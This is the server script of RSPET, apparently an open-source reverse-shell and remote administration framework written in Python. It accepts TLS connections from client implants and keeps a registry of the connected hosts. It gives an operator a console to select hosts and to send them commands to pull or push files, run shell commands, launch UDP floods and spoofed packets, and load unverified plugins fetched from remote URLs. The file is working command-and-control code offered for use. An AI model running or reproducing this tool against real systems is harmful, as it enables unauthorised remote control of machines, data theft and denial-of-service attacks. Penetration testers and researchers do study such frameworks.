#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""rspet_server.py: RSPET's Server-side script."""
import os.path
import re
import ssl
import argparse
import json
import requests
import logging
import struct
from sys import exit as sysexit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
from socket import SHUT_RDWR
from datetime import datetime
from oscrypto import asymmetric
from certbuilder import CertificateBuilder, pem_armor_certificate
from _thread import start_new_thread
# from threading import Thread # Will bring back at some point
from pluginbase import PluginBase
import rspet.server.tab as tab


__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas"]
__license__ = "MIT"
__version__ = "1.0.0"
__maintainer__ = "Kolokotronis Panagiotis"
__path__ = os.path.dirname(__file__)


class ReturnCodes(object):
    """Enumeration containing the Return Codes of the Server."""
    OK, InvalidSyntax, SocketError, LocalAccessError, RemoteAccessError = range(5)
    OutOfScope, CommandNotFound, InvalidHostID = range(5, 8)


class API(object):
    """Define RSPET Server's Api."""
    def __init__(self, max_conns, ip, port):
        """Initialize Server object."""
        self.server = Server(max_conns, ip, port)

    def call_plugin(self, command, args=[]):
        """Call a plugin command"""
        try:
            ret = self.server.execute(command, args)
        except KeyError:
            ret = [None, 6, ("%s : No such command." % command)]
        return {"transition": ret[0],
                "code": ret[1],
                "string": ret[2]}

    def select(self, args=[]):
        """Manage host selection."""
        ret = self.server.select(args)
        return {"transition": None,
                "code": ret[0],
                "string": ret[1]}

    def help(self):
        """
        Temporary. Should interface Server's help when Circular references are
        removed.
        """
        help_dct = {}

        for cmd in self.server.commands:
            help_dct[cmd] = {
                'help': self.server.commands[cmd].__help__,
                'syntax': None,
                'states': self.server.commands[cmd].__states__
            }
            try:
                help_dct[cmd]["syntax"] = self.server.commands[cmd].__syntax__
            except AttributeError:
                pass

        return help_dct

    def refresh(self):
        """Interface Server object's clean function."""
        self.server.clean()

    def get_server(self):
        """Return the instance of Server object for low level API."""
        return self.server

    def get_hosts(self):
        """Return hosts by ID."""
        hosts = self.server.get_hosts()
        ret = {}
        for h_id in hosts:
            host = hosts[h_id]
            ret[h_id] = {
                "ip": host.get_ip(),
                "port": host.get_port(),
                "version": str(host.get_version()),
                "type": str(host.get_type()),
                "system": str(host.get_systemtype()),
                "hostname": str(host.get_hostsname())
            }
        return ret

    def quit(self):
        """Quit API and Destroy Server instance."""
        self.server.trash()


class Console(object):
    """Provide command line interface for the server."""
    prompt = "~$ "  # Current command prompt.
    states = {}  # Dictionary that defines available states.
    state = "basic"  # CLI "entry" state.

    def __init__(self, max_conns, ip, port):
        """Start server and initialize states."""
        self.server = Server(max_conns, ip, port)
        # If done directly @ Class attributes, Class funcs are not recognised.
        Console.states['basic'] = Console._basic
        Console.states['connected'] = Console._connected
        Console.states['multiple'] = Console._multiple
        Console.states['all'] = Console._all

    def trash(self):
        """Delete Console."""
        self.server.trash()

    def loop(self):
        """Main CLI loop"""
        self._logo()

        while not self.server.quit_signal:
            tab.readline_completer(
                [
                    s for s, o in self.server.commands.items()
                    if self.state in o.__states__
                ]
            )
            try:
                cmd = input(Console.prompt).lower()
            except (KeyboardInterrupt, EOFError):
                raise KeyboardInterrupt

            cmdargs = cmd.split(" ")
            # "Sanitize" user input by stripping spaces.
            cmdargs = [x for x in cmdargs if x != ""]
            if cmdargs == []:  # Check if command was empty.
                continue
            cmd = cmdargs[0]
            del cmdargs[0]
            # Execute command.
            try:
                if Console.state in self.server.commands[cmd].__states__:
                    results = self.server.execute(cmd, cmdargs)
                else:
                    results = [None, 5, "Command used out of scope."]
            except KeyError:
                results = [
                    None, 6,
                    "Command not found. Try help for a list of all commands!"
                ]
            tmp_state = results[0]
            # return_code = results[1] # Future use ? Also API.
            return_string = results[2]
            if return_string != "":
                print(return_string)
            try:
                Console.states[tmp_state](self)  # State transition.
            except KeyError:  # If none is returned make no state change.
                continue
        self.server.trash()

    def _basic(self):
        self.server.clean()
        self.server.select([])
        Console.prompt = "~$ "
        Console.state = "basic"

    def _connected(self):
        try:
            Console.prompt = "[%s]~$ " % self.server.get_selected()[0].get_ip()
        except IndexError:
            pass
        else:
            Console.state = "connected"

    def _multiple(self):
        if len(self.server.get_selected()) != 0:
            Console.prompt = "[MULTIPLE]~$ "
            Console.state = "multiple"

    def _all(self):
        if len(self.server.get_selected()) != 0:
            Console.prompt = "[ALL]~$ "
            Console.state = "multiple"

    def _logo(self):
        """Print logo and Authorship/License."""
        print(r"#####################################################")
        print(r"__________  _________________________________________")
        print(r"\______   \/   _____/\______   \_   _____/\__    ___/")
        print(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
        print(r" |    |   \/        \ |    |    |        \  |    |   ")
        print(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
        print(r"        \/        \/                   \/            ")
        print(r"")
        print(r" -Author: panagiks (http://panagiks.xyz)")
        print(r" -Co-Author: dzervas (http://dzervas.gr)")
        print(r" -Licence: MIT @ panagiks")
        print(r"#####################################################")
        print(r"")


class Server(object):
    """
    Main class of the server. Manage server socket, selections and call plugins
    """
    # hosts = [] # List of hosts
    # selected = [] # List of selected hosts
    # plugins = [] # List of active plugins
    # config = {} # Reserved for future use (dynamic plug-in loading).

    def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
        """Start listening on socket."""
        ################# Replaced with dict named connection. ################
        self.connection = {}
        self.connection["ip"] = ip
        self.connection["port"] = port
        self.connection["max_conns"] = max_conns
        self.connection["sock"] = socket(AF_INET, SOCK_STREAM)
        #######################################################################
        self.quit_signal = False
        plugin_base = PluginBase(
            package='rspet.server.plugins',
            searchpath=['/etc/rspet/plugins']
        )
        self.source = plugin_base.make_plugin_source(
            searchpath=['/etc/rspet/plugins'],
            identifier='rspet'
        )
        self.commands = {}
        ################### Replaced with dict named clients. #################
        self.clients = {}
        self.clients["hosts"] = {}  # Dictionary of hosts
        self.clients["selected"] = []  # List of selected hosts
        self.clients["serial"] = 0
        #######################################################################
        self.log_opt = []  # List of Letters. Indicates logging level
        ################### Replaced with dict named plugins. #################
        self.plugins = {}
        self.plugins["loaded"] = {}  # List of loaded plugins
        self.plugins["installed"] = self.installed_plugins()  # List of installed plugins
        self.plugins["available"] = {}  # List of available plugins
        self.plugins["base_url"] = ""
        #######################################################################
        with open("/etc/rspet/config.json") as json_config:
            self.config = json.load(json_config)
        ######################### Certificate handling ########################
        if 'certs' not in self.config:
            self.config['certs'] = {}
            crt_fl = os.path.join(__path__, 'server.crt')
            key_fl = os.path.join(__path__, 'server.key')
            if not (os.path.isfile(crt_fl) and os.path.isfile(key_fl)):
                public_key, private_key = asymmetric.generate_pair(
                    'rsa',
                    bit_size=4096
                )
                with open(key_fl, 'wb') as key:
                    key.write(asymmetric.dump_private_key(private_key, None))
                builder = CertificateBuilder(
                    {
                        u'country_name': u'RT',
                        u'state_or_province_name': u'RT',
                        u'locality_name': u'RT',
                        u'organization_name': u'RT',
                        u'common_name': u'RT',
                    },
                    public_key
                )
                builder.self_signed = True
                certificate = builder.build(private_key)
                with open(crt_fl, 'wb') as crt:
                    crt.write(pem_armor_certificate(certificate))
            self.config['certs']['crt'] = crt_fl
            self.config['certs']['key'] = key_fl
        #######################################################################
        logging.basicConfig(
            filename='log.txt',
            filemode='w',
            level=self.config["log"][0]
        )
        self.plugins["base_url"] = self.config["plugin_base_url"]
        self._log("DEBUG", "Session Start.")
        for plugin in self.config["plugins"]:
            self.load_plugin(plugin)
        try:
            self.connection["sock"].bind((self.connection["ip"],
                                          int(self.connection["port"])))
            self.connection["sock"].listen(self.connection["max_conns"])
            self._log("DEBUG", "Socket bound @ %s:%s." % (
                self.connection["ip"],
                self.connection["port"]
            ))
        except sock_error:
            print("Something went wrong during binding & listening")
            self._log("ERROR", "Error binding socket @ %s:%s." % (
                self.connection["ip"],
                self.connection["port"]
            ))
            sysexit()
        start_new_thread(self.loop, ())

    def trash(self):
        """Safely closes all sockets"""
        for host in self.clients["hosts"]:
            self.clients["hosts"][host].trash()
        self.clean()
        self.select([])
        self.connection["sock"].close()

    def _log(self, level, action):

        logging_method = {
            "DEBUG": logging.debug,
            "INFO": logging.info,
            "WARNING": logging.warning,
            "ERROR": logging.error
        }

        timestamp = datetime.now()
        log_message = "%s : [%s/%s/%s %s:%s:%s] => %s\n" % (
            level,
            str(timestamp.day),
            str(timestamp.month),
            str(timestamp.year),
            str(timestamp.hour),
            str(timestamp.minute),
            str(timestamp.second),
            action
        )
        try:
            logging_method[level](log_message)
        except KeyError:
            logging_method["INFO"](log_message)

    def loop(self):
        """
        Main server loop for accepting connections. Better call it on its
        own thread
        """
        while True:
            try:
                (csock, (ipaddr, port)) = self.connection["sock"].accept()
                self._log("DEBUG", "New connection from %s:%s" % (str(ipaddr),
                                                                  str(port)))
            except sock_error:
                raise sock_error
            try:
                csock = ssl.wrap_socket(csock, server_side=True,
                                        certfile=self.config['certs']['crt'],
                                        keyfile=self.config['certs']['key'],
                                        ssl_version=ssl.PROTOCOL_TLSv1_2)
            except AttributeError:  # All PROTOCOL consts are merged on TLS in Python2.7.13
                csock = ssl.wrap_socket(csock, server_side=True,
                                        certfile=self.config['certs']['crt'],
                                        keyfile=self.config['certs']['key'],
                                        ssl_version=ssl.PROTOCOL_TLS)
            self.clients["hosts"][str(self.clients["serial"])] = Host(
                csock,
                ipaddr,
                port,
                self.clients["serial"]
            )
            self.clients["serial"] += 1

    def setup_command(self, name, command):
        """Hook function called by plugins to register their commands."""
        self.commands[name] = command

    def load_plugin(self, plugin_name):
        """Asyncronously load a plugin."""
        if plugin_name in self.plugins["installed"]:
            try:
                plugin = self.source.load_plugin(plugin_name)
                plugin.setup(self)
                self._log("DEBUG", "%s: plugin loaded." % plugin)
                name = plugin.__name__.split('.')[-1]
                self.plugins["loaded"][name] = self.plugins["installed"][name]
            except ImportError:
                self._log("ERROR", "%s: plugin failed to load." % plugin_name)
        else:
            self._log("ERROR", "%s: plugin not installed" % plugin_name)

    def install_plugin(self, plugin):
        """Install a plugin from a loaded repo."""
        # Get the url for the plugin Download.
        try:
            plugin_url = self.available_plugins()[plugin]['uri']
        except KeyError:
            self._log("ERROR", "%s: plugin does not exist" % plugin)
        else:
            # Download the plugin and write it to a file.
            plugin_obj = requests.get(plugin_url)
            plugin_cont = plugin_obj.text
            with open(("/etc/rspet/plugins/%s.py" % plugin), 'w') as pfile:
                pfile.write(plugin_cont)
            self._log("DEBUG", "%s: plugin installed" % plugin)

    def available_plugins(self):
        """Get a list of all available plugins."""
        # Clean Dictionary.
        self.plugins["available"] = {}
        # Iterate through all enabled repos.
        for base_url in self.plugins["base_url"]:
            # Get info file from repo, in case of error, log and continue.
            json_file = requests.get(base_url + '/plugins.json')
            if json_file.status_code != 200:
                self._log("ERROR", "Error connecting to plugin repo %s" %
                          base_url)
                continue
            json_dct = json_file.json()
            # Iterate through plugins available in current repo.
            for plugin in json_dct:
                # Make sure plugin is not already listed from prev repo.
                if plugin not in self.plugins["available"]:
                    self.plugins["available"][plugin] = json_dct[plugin]
                    # Trasform relative uri from json file to absolute.
                    self.plugins["available"][plugin]["uri"] = base_url + \
                        self.plugins["available"][plugin]["uri"]
        return self.plugins["available"]

    def installed_plugins(self):
        """List all plugins installed."""
        from ast import parse, get_docstring
        plugins = {}
        installed = self.source.list_plugins()
        for plugin in installed:
            plug_doc = parse(open('/etc/rspet/plugins/%s.py' % plugin).read())
            plugins[plugin] = get_docstring(plug_doc)
        return plugins

    def loaded_plugins(self):
        """Interface function. Return loaded plugins."""
        return self.plugins["loaded"]

    def select(self, ids=None):
        """Selects given host(s) based on ids

        Keyword argument:
        ids     -- Array of ids of hosts. Empty array unselects all. None
        selects all
        """
        ret = [0, ""]
        flag = False
        self.clients["selected"] = []
        if ids is None:
            for h_id in self.clients["hosts"]:
                self.clients["selected"].append(self.clients["hosts"][h_id])
        else:
            # self.clients["selected"] = []
            for i in ids:
                i = str(i)
                try:
                    if self.clients["hosts"][i] not in self.clients["selected"]:
                        self.clients["selected"].append(self.clients["hosts"][i])
                except KeyError:
                    flag = True
        if flag:
            ret[0] = 7
            ret[1] = "One or more host IDs were invalid. Continuing with valid hosts ..."
        return ret

    def get_selected(self):
        """Interface function. Return selected hosts."""
        return self.clients["selected"]

    def get_hosts(self):
        """Interface function. Return all hosts."""
        return self.clients["hosts"]

    def execute(self, cmd, args):
        """Execute a command on all selected clients.

        Keyword argument:
        cmd     -- Function to call for each selected host.
        Function signature myfunc(Host, args[0], args[1], ...)
        It should accept len(args) - 1 arguments
        args    -- Arguments to pass to the command function"""

        ret = [None, 0, ""]
        try:
            ret = self.commands[cmd](self, args)
        except KeyError:
            raise KeyError
        return ret

    def help(self, args):
        """Print all the commands available in the current interface allong with
        their docsting."""
        help_str = ""

        if len(args) == 0:
            if self.commands:
                help_str += "Server commands:"
                for cmd in self.commands:
                    if Console.state in self.commands[cmd].__states__:
                        help_str += ("\n\t%s: %s" % (cmd,
                                     self.commands[cmd].__help__))
        else:
            help_str += ("Command : %s" % args[0])
            try:
                help_str += "\nSyntax : %s" % self.commands[args[0]].__syntax__
            except KeyError:
                help_str += """\nCommand not found! Try help with no arguments
                for a list of all commands available in current scope."""
            except AttributeError:  # Command has no arguments declared.
                pass
        return help_str

    def clean(self):
        """Remove hosts tagged for deletion."""
        tmp_dct = {}
        for host_id in self.clients["hosts"]:
            if not self.clients["hosts"][host_id].deleteme:
                tmp_dct[host_id] = self.clients["hosts"][host_id]
            elif self.clients["hosts"][host_id] in self.clients["selected"]:
                self.clients["selected"].remove(self.clients["hosts"][host_id])
        self.clients["hosts"] = tmp_dct

    def quit(self):
        """Interface function. Raise a Quit signal."""
        self.quit_signal = True


class Host(object):
    """Class for hosts. Each Host object represent one host"""
    command_dict = {
        'killMe': '00000',
        'getFile': '00001',
        'getBinary': '00002',
        'sendFile': '00003',
        'sendBinary': '00004',
        'udpFlood': '00005',
        'udpSpoof': '00006',
        'command': '00007',
        'KILL': '00008',
        'loadPlugin': '00009',
        'unloadPlugin': '00010',
        'runPluginCommand': '00011',
        'update': '00012'
    }

    def __init__(self, sock, ip, port, h_id):
        """Accept the connection and initialize variables."""
        self.deleteme = False
        ################# Replaced with dict named connection. ################
        self.connection = {}
        self.connection["sock"] = sock
        self.connection["ip"] = ip
        self.connection["port"] = port
        #######################################################################
        self.id = h_id
        #################### Replaced with dict named info. ###################
        self.info = {}
        self.info["version"] = ""
        self.info["type"] = ""
        self.info["systemtype"] = ""
        self.info["hostname"] = ""
        self.info["plugins"] = []
        self.info["commands"] = []
        #######################################################################

        try:
            ### Get Version ###
            tmp = self.recv().split("-")
            self.info["version"] = tmp[0]
            self.info["type"] = tmp[1]
            #################
            ### Get System Type ###
            self.info["systemtype"] = self.recv()
            #####################
            ### Get Hostname ###
            self.info["hostname"] = self.recv()
            ##################
        except sock_error:
            self.trash()

    def get_ip(self):
        """Interface function. Return Client's IP address."""
        return self.connection["ip"]

    def get_port(self):
        """Interface function. Return Client's port."""
        return self.connection["port"]

    def get_version(self):
        """Interface function. Return Client Module's version."""
        return self.info["version"]

    def get_type(self):
        """Interface function. Return the type of the Client Module."""
        return self.info["type"]

    def get_systemtype(self):
        """Interface function. Retrun the type of the Client's system."""
        return self.info["systemtype"]

    def get_hostsname(self):
        """Interface function. Return Client's hostname."""
        return self.info["hostname"]

    def trash(self):
        """Gracefully delete host."""
        if not self.deleteme:
            try:
                self.send(Host.command_dict['killMe'])
            except sock_error:
                self.purge()
                raise sock_error
            self.purge()

    def purge(self):
        """Delete host not so gracefully."""
        self.deleteme = True
        self.connection["sock"].shutdown(SHUT_RDWR)
        self.connection["sock"].close()

    def __eq__(self, other):
        """Check weather two sockets are the same socket."""
        # Why is this here ?
        return self.connection["sock"] == other.connection["sock"]

    def send(self, msg):
        """Send message to host"""
        if msg is not None and len(msg) > 0:
            try:
                msg = msg.encode('UTF-8')
            except AttributeError:
                pass
            msg = struct.pack('>I', len(msg)) + msg
            try:
                self.connection["sock"].send(msg)
            except sock_error:
                raise sock_error

    def recv(self):
        """Receive from host"""
        raw_msglen = self.recv_helper(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = self.recv_helper(msglen)
        if not data:
            raise sock_error
        try:
            data = data.decode('UTF-8')
        except UnicodeDecodeError:
            pass
        return data

    def recv_helper(self, n):
        data = b''
        while len(data) < n:
            packet = self.connection["sock"].recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


def main():
    """Main function."""
    parser = argparse.ArgumentParser(description='RSPET Server module.')
    parser.add_argument("-c", "--clients", nargs=1, type=int, metavar='N',
                        help="Number of clients to accept.", default=[5])
    parser.add_argument("--ip", nargs=1, type=str, metavar='IP',
                        help="IP to listen for incoming connections.",
                        default=["0.0.0.0"])
    parser.add_argument("-p", "--port", nargs=1, type=int, metavar='PORT',
                        help="Port number to listen for incoming connections.",
                        default=[9000])
    args = parser.parse_args()
    cli = Console(args.clients[0], args.ip[0], args.port[0])
    try:
        cli.loop()
    except KeyError:
        print("Got KeyError")
        cli.trash()
        del cli
        sysexit()
    except KeyboardInterrupt:
        cli.trash()
        del cli
        sysexit()
    cli.trash()
    del cli


if __name__ == "__main__":
    main()
